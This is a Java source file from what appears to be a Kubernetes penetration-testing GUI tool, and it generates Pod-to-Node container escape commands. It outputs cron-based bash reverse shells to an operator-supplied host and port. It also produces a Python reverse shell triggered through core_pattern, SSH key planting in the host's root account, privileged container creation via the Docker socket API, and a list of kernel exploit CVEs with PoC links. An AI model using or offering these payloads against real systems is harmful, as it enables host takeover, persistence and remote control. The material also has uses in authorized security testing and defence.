package com.k8spen.tool.controller;

import javafx.scene.control.ComboBox;
import javafx.scene.control.TextArea;
import javafx.scene.control.TextField;

/**
 * 权限提升 — Pod到Node逃逸: 检测、特权逃逸、挂载逃逸、内核漏洞逃逸
 */
public class EscapeHandler {

    private final ControllerContext ctx;
    private final TextArea escapeCheckCmds;
    private final TextField escapePrivLhost, escapePrivLport;
    private final TextArea escapePrivOutput;
    private final ComboBox<String> escapeMountType;
    private final TextField escapeMountLhost, escapeMountLport;
    private final TextArea escapeMountOutput;
    private final TextArea escapeKernelCmds;

    public EscapeHandler(ControllerContext ctx,
                         TextArea escapeCheckCmds,
                         TextField escapePrivLhost, TextField escapePrivLport, TextArea escapePrivOutput,
                         ComboBox<String> escapeMountType,
                         TextField escapeMountLhost, TextField escapeMountLport, TextArea escapeMountOutput,
                         TextArea escapeKernelCmds) {
        this.ctx = ctx;
        this.escapeCheckCmds = escapeCheckCmds;
        this.escapePrivLhost = escapePrivLhost; this.escapePrivLport = escapePrivLport;
        this.escapePrivOutput = escapePrivOutput;
        this.escapeMountType = escapeMountType;
        this.escapeMountLhost = escapeMountLhost; this.escapeMountLport = escapeMountLport;
        this.escapeMountOutput = escapeMountOutput;
        this.escapeKernelCmds = escapeKernelCmds;
    }

    public void init() {
        escapeCheckCmds.setText(
                "# ======== Pod到Node逃逸条件检测 ========\n"
                + "# 在已获取的Pod shell中执行以下命令\n\n"
                + "# 1. 检查是否为特权容器 (CapEff为0000003fffffffff或0000001fffffffff)\n"
                + "cat /proc/1/status | grep -i capeff\n\n"
                + "# 2. 检查是否挂载了宿主机 procfs (存在两个core_pattern则可能挂载)\n"
                + "find / -name core_pattern 2>/dev/null\ncat /proc/sys/kernel/core_pattern\n\n"
                + "# 3. 检查是否挂载了docker.sock\n"
                + "ls -la /var/run/docker.sock 2>/dev/null\nls -la /run/docker.sock 2>/dev/null\n\n"
                + "# 4. 检查是否挂载了宿主机根目录\n"
                + "mount | grep ' / ' | grep -v overlay\nls /host/ 2>/dev/null\nls /mnt/ 2>/dev/null\n\n"
                + "# 5. 检查磁盘设备 (特权模式可读)\n"
                + "fdisk -l 2>/dev/null || lsblk 2>/dev/null\n\n"
                + "# 6. 检查内核版本 (用于判断内核漏洞)\n"
                + "uname -r\n\n"
                + "# 7. 检查是否挂载了cgroup\n"
                + "mount | grep cgroup\nls /sys/fs/cgroup/*/release_agent 2>/dev/null\n\n"
                + "# 8. 检查是否在docker组\n"
                + "id | grep docker\n\n"
                + "# 9. 自动检测脚本 (container-escape-check)\n"
                + "# https://github.com/teamssix/container-escape-check\n"
        );

        escapeMountType.getItems().addAll(
                "挂载根目录逃逸 (chroot)",
                "挂载根目录逃逸 (定时任务反弹)",
                "挂载procfs逃逸 (core_pattern)",
                "挂载docker.sock逃逸");
        escapeMountType.setValue("挂载根目录逃逸 (chroot)");

        escapeKernelCmds.setText(
                "# ======== 内核漏洞逃逸 ========\n"
                + "# 容器与宿主机共享内核, 内核提权漏洞可导致逃逸\n\n"
                + "# 先检查内核版本:\nuname -r\n\n"
                + "# === CVE-2016-5195 DirtyCow ===\n# 影响: 2.6.22 <= 内核 <= 4.8.3\n# PoC: https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs\n# 编译: gcc -pthread dirty.c -o dirty -lcrypt\n\n"
                + "# === CVE-2020-14386 ===\n# 影响: 4.6 <= 内核 <= 5.9\n# 需要CAP_NET_RAW权限\n\n"
                + "# === CVE-2022-0847 DirtyPipe ===\n# 影响: 5.8 <= 内核 < 5.16.11, != 5.15.25, != 5.10.102\n# PoC: https://github.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit\n# 编译: gcc exploit.c -o exploit\n\n"
                + "# === CVE-2022-0492 (cgroup escape) ===\n# 影响: 内核 < 5.17\n# 条件: 容器需要CAP_SYS_ADMIN\n\n"
                + "# === CVE-2022-23222 (eBPF) ===\n# 影响: 5.8 <= 内核 <= 5.16\n\n"
                + "# === CVE-2021-22555 (Netfilter) ===\n# 影响: 2.6.19 <= 内核\n# PoC: https://github.com/google/security-research/tree/master/pocs/linux/cve-2021-22555\n"
        );
    }

    public void escapeCopyCheck()  { if (escapeCheckCmds.getText() != null) ctx.copyToClipboard(escapeCheckCmds.getText()); }
    public void escapeCopyKernel() { if (escapeKernelCmds.getText() != null) ctx.copyToClipboard(escapeKernelCmds.getText()); }
    public void escapeCopyPriv()   { if (escapePrivOutput.getText() != null) ctx.copyToClipboard(escapePrivOutput.getText()); }
    public void escapeCopyMount()  { if (escapeMountOutput.getText() != null) ctx.copyToClipboard(escapeMountOutput.getText()); }

    public void escapeGenPriv() {
        String lhost = escapePrivLhost.getText().trim();
        String lport = escapePrivLport.getText().trim();
        if (lport.isEmpty()) lport = "4444";
        StringBuilder sb = new StringBuilder();
        sb.append("# ======== 特权模式逃逸 (Privileged Container) ========\n# 前提: 容器以 --privileged 或 securityContext.privileged=true 启动\n\n");
        sb.append("# === 方法一: 挂载宿主机磁盘 + chroot ===\nfdisk -l 2>/dev/null || lsblk\nmkdir -p /hostroot\nmount /dev/sda1 /hostroot    # 或 /dev/vda3 等\nchroot /hostroot\n\n");
        sb.append("# === 方法二: 挂载磁盘 + 写定时任务反弹Shell ===\n");
        if (!lhost.isEmpty()) {
            sb.append("mkdir -p /hostroot && mount /dev/sda1 /hostroot\n");
            sb.append("echo '* * * * * /bin/bash -c \"bash -i >& /dev/tcp/").append(lhost).append("/").append(lport).append(" 0>&1\"' >> /hostroot/var/spool/cron/root\n\n");
            sb.append("# 或写入crontab (Debian/Ubuntu)\necho '* * * * * root /bin/bash -c \"bash -i >& /dev/tcp/").append(lhost).append("/").append(lport).append(" 0>&1\"' >> /hostroot/etc/cron.d/escape\n\n");
        } else sb.append("# 请填写LHOST和LPORT后重新生成\n\n");
        sb.append("# === 方法三: 写SSH公钥 ===\nmkdir -p /hostroot && mount /dev/sda1 /hostroot\nmkdir -p /hostroot/root/.ssh\necho 'ssh-rsa AAAA... user@host' >> /hostroot/root/.ssh/authorized_keys\n");
        escapePrivOutput.setText(sb.toString());
        ctx.log("[+] 已生成特权模式逃逸命令");
    }

    public void escapeGenMount() {
        String type = escapeMountType.getValue();
        String lhost = escapeMountLhost.getText().trim();
        String lport = escapeMountLport.getText().trim();
        if (lport.isEmpty()) lport = "4444";
        StringBuilder sb = new StringBuilder();

        if (type.contains("chroot")) {
            sb.append("# ======== 挂载根目录逃逸 (chroot) ========\n# 前提: Pod已挂载宿主机根目录到容器内\n# 常见挂载点: /host, /mnt, /hostroot\n\n");
            sb.append("ls /host/etc/shadow 2>/dev/null && echo '/host 是宿主机根目录'\nls /mnt/etc/shadow 2>/dev/null && echo '/mnt 是宿主机根目录'\n\nchroot /host   # 或 chroot /mnt\n\nid && hostname && cat /etc/shadow\n");
        } else if (type.contains("定时任务")) {
            sb.append("# ======== 挂载根目录逃逸 (定时任务反弹) ========\n# 前提: Pod已挂载宿主机根目录\n\n");
            if (!lhost.isEmpty()) {
                sb.append("echo '* * * * * /bin/bash -c \"bash -i >& /dev/tcp/").append(lhost).append("/").append(lport).append(" 0>&1\"' >> /host/var/spool/cron/root\n\n");
                sb.append("# Debian/Ubuntu\necho '* * * * * root /bin/bash -c \"bash -i >& /dev/tcp/").append(lhost).append("/").append(lport).append(" 0>&1\"' >> /host/etc/cron.d/escape\n\n");
                sb.append("# 注意: cron默认使用/bin/sh, 不支持>& 语法\necho '* * * * * root bash -c \"exec 5<>/dev/tcp/").append(lhost).append("/").append(lport).append("; cat <&5 | while read line; do $line 2>&5 >&5; done\"' >> /host/etc/cron.d/escape\n");
            } else sb.append("# 请填写LHOST和LPORT后重新生成\n");
        } else if (type.contains("procfs")) {
            sb.append("# ======== 挂载procfs逃逸 (core_pattern) ========\n# 前提: 容器挂载了宿主机/proc目录\n# 原理: 利用/proc/sys/kernel/core_pattern管道符执行命令\n\n");
            sb.append("find / -name core_pattern 2>/dev/null\n\nCONTAINER_PATH=$(sed -n 's/.*upperdir=\\([^,]*\\).*/\\1/p' /proc/mounts | head -1)\necho \"Container path: $CONTAINER_PATH\"\n\n");
            if (!lhost.isEmpty()) {
                sb.append("cat > /tmp/.x.py << 'PYEOF'\n#!/usr/bin/python3\nimport os,socket,subprocess\ns=socket.socket()\ns.connect((\"").append(lhost).append("\",").append(lport).append("))\nos.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2)\nsubprocess.call([\"/bin/sh\",\"-i\"])\nPYEOF\nchmod +x /tmp/.x.py\n\n");
            } else sb.append("# 请填写LHOST和LPORT后重新生成\n\n");
            sb.append("echo \"|$CONTAINER_PATH/tmp/.x.py\" > /host_proc/sys/kernel/core_pattern\n\ncat > /tmp/crash.c << 'CEOF'\n#include <stdio.h>\nint main(void) {\n    int *p = NULL;\n    *p = 0;  // segfault -> core dump -> trigger core_pattern\n    return 0;\n}\nCEOF\ngcc /tmp/crash.c -o /tmp/crash && /tmp/crash\n");
        } else if (type.contains("docker.sock")) {
            sb.append("# ======== 挂载docker.sock逃逸 ========\n# 前提: 容器挂载了/var/run/docker.sock\n\nls -la /var/run/docker.sock\n\n# 如果有docker客户端:\ndocker run -v /:/host --privileged -it alpine chroot /host\n\n");
            sb.append("# 如果没有docker客户端, 用curl调用API:\ncurl -s --unix-socket /var/run/docker.sock http://localhost/containers/json | python3 -m json.tool\n\n");
            sb.append("curl -s --unix-socket /var/run/docker.sock -X POST \\\n  -H 'Content-Type: application/json' \\\n  -d '{\"Image\":\"alpine\",\"Cmd\":[\"chroot\",\"/host\"],\"Mounts\":[{\"Type\":\"bind\",\"Source\":\"/\",\"Target\":\"/host\"}],\"HostConfig\":{\"Privileged\":true}}' \\\n  http://localhost/containers/create?name=pwn\n\ncurl -s --unix-socket /var/run/docker.sock -X POST http://localhost/containers/pwn/start\n");
        }

        escapeMountOutput.setText(sb.toString());
        ctx.log("[+] 已生成挂载目录逃逸命令: " + type);
    }
}
